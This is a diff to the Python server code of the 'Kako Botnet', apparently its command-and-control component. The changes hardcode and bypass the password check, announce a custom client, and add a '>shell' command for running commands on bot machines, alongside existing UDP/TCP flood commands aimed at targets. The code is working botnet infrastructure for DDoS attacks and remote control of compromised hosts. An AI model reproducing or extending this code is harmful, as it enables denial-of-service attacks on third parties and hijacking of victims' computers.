@@ -57,14 +57,17 @@ def clientThread(conn, addr):
 		return conn.recv(512)
 
 	rank = rank(conn)
-	password = password(conn)
-	nickname = nickname(conn)
-	if rank.startswith(rankAdmin) and password.startswith(pwordAdmin) or rank.startswith(rankGuest) and password.startswith(pwordGuest):
+	#password = password(conn)
+	#nickname = nickname(conn)
+	password = "Password"
+	nickname = "Law"
+	#if rank.startswith(rankAdmin) and password.startswith(pwordAdmin) or rank.startswith(rankGuest) and password.startswith(pwordGuest):
+	if rank.startswith(rankAdmin) or rank.startswith(rankGuest):
 		conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
-		conn.sendall("[>] Made solely for DDoS but that depends on your bot [<]\r\n")
-		conn.sendall("[!] If you do anything I, Law, disapprove of I will not hesitate to ban your IP Address. Everything is logged.\r\n")
+		conn.sendall("[?] Please use the custom client.py made by Law\r\n")
+		conn.sendall("[?] Or else it made not work as its been untested with other clients\r\n")
 		conn.sendall("[?] Type >help for a list of commands [?]\r\n")
-		conn.sendall("[?] Your nickname is: %s" % nickname)
+		conn.sendall("[?] Your nickname is: %s\r\n" % nickname)
 		while True:
 			try:
 				message = conn.recv(512)
@@ -89,9 +92,11 @@ def clientThread(conn, addr):
 					conn.sendall("[?] >credits - Displays the Programmers and Helpers\r\n")
 					conn.sendall("\r\n")
 					conn.sendall("[>] Bot Commands [<]\r\n")
+					conn.sendall("[!] Warning! These commands are built into the client made by Law not the server")
 					conn.sendall("[?] >udp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol UDP\r\n")
 					conn.sendall("[?] >tcp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol TCP\r\n")
 					conn.sendall("[?] >killbots - Disconnects all bots\r\n")
+					conn.sendall("[?] >shell - Allows the host to use commands from the bots terminal\r\n")
 
 				if message.lower().startswith(">status"):
 					conn.sendall("[+] Clients Connected: %s\r\n" % clients)
@@ -99,6 +104,7 @@ def clientThread(conn, addr):
 
 				if message.lower().startswith(">credits"):
 					conn.sendall("[?] Law - Idea and main Programmer(AKA the guy who made this command)\r\n")
+					conn.sendall("[?] Also coded the client.py file from scratch\r\n")
 					conn.sendall("[?] Picses - Coded the bot connection\r\n")
 					conn.sendall("[?] Mac.G - Helped figure out how to broadcast commands using a list\r\n")
 			except:
@@ -145,7 +151,8 @@ def bot_thread(conn):
 		try:
 			data = conn.recv(512)
 		except:
-			pass
+			print "[-] Bot Disconnected"
+			break
 		if not data:
 			print "[-] Bot Disconnected"
 			conn.close()
